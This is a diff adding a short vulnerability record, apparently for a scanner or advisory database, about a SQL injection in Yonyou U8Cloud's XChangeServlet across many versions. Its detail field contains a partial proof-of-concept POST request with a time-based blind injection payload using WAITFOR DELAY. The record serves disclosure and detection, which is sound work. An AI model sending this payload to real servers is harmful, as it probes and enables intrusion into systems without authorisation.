@@ -1,0 +1,13 @@
+vendor = "用友"
+name = "用友U8Cloud XChangeServlet SQL注入漏洞（全版本）"
+type = "SQL注入"
+path = "/u8cloud/XChangeServlet"
+version = "2.0/2.1/2.3/2.5/2.6/2.7/2.65/3.0/3.1/3.2/3.5/3.6/3.6sp/5.0/5.0sp/5.1/5.1sp"
+detail = """POST /u8cloud/XChangeServlet HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded
+
+sender=1' UNION SELECT ...;WAITFOR DELAY '0:0:5'--"""
+fix = "从厂商安全中心下载对应版本补丁"
+date = 20260708
+label = "1day"
+cve = "LDYVUL-2026-00120316"
+verifier = "360"
